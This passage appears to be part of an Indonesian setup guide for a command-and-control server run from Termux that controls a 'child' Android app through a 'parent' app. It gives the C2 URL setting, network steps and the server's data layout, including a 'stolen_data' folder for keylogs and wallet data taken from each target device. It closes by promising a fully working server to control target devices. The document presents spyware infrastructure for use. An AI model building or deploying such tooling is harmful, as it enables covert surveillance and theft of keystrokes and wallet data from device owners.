
    **Contoh:** `const val C2_SERVER_BASE_URL = "http://192.168.1.100:5000"`

3.  **Pastikan Akses Jaringan:**
    *   Kedua perangkat Android (yang menjalankan `bocah-app` dan `ortu-app`) dan perangkat yang menjalankan Termux **harus berada dalam jaringan Wi-Fi yang sama**.
    *   Pastikan tidak ada firewall di perangkat Android Anda yang memblokir akses ke port 5000.
    *   Aplikasi Android dikonfigurasi dengan `android:usesCleartextTraffic="true"` untuk memungkinkan koneksi HTTP ke server lokal. Untuk deployment yang lebih aman (di luar jaringan lokal), Anda harus mengonfigurasi Flask untuk HTTPS dan memperbarui konfigurasi aplikasi Android.

---

### 6. Struktur Data Server

Server C2 akan secara otomatis membuat dan mengelola file-file berikut di direktori yang sama dengan `server.py`:

*   **`devices_data.json`**: Menyimpan informasi konfigurasi dan status setiap `bocah-app` yang terdaftar (Device ID, kunci enkripsi, status, lokasi, dll.).
*   **`chat_messages.json`**: Menyimpan semua histori pesan obrolan antara `ortu-app` dan `bocah-app`.
*   **`stolen_data/`**: Direktori ini akan dibuat untuk menyimpan semua file yang berisi data yang "dicuri" (keylogs, data generik, data wallet konseptual), diatur per Device ID.

---

Dengan mengikuti langkah-langkah ini, Anda akan memiliki server C2 yang berfungsi penuh, siap untuk mengendalikan perangkat target Anda dari Termux. Jalankan perintah Anda dengan presisi.
